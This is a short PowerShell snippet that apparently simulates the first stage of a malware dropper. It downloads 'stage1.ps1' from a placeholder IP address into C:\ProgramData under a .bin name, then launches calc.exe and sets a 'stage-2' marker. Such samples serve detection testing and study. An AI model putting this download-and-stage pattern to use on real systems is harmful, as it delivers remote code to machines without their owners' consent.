$FetchUrl = 'http://203.0.113.196/stage1.ps1'
$Stage2Path = 'C:\ProgramData\stage1.bin'
$ConnectionTimeout = 79
Invoke-WebRequest -Uri $FetchUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$StageMarker = "stage-2"
